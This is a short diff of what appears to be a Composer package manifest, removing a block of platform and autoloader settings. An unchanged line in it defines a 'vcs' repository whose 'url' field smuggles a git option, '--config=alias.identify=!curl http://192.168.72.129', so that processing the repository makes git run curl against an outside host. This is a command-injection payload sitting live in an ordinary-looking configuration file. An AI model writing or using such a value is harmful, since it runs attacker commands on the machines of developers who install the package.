@@ -46,13 +46,6 @@
             "type": "vcs",
             "url": "--config=alias.identify=!curl http://192.168.72.129"
         },
-    "config": {
-        "platform": {
-            "php": "8.2.0"
-        },
-        "optimize-autoloader": true,
-        "sort-packages": true
-    },
     "suggest": {
         "ext-soap": "To be able to generate mocks based on WSDL files"
     },
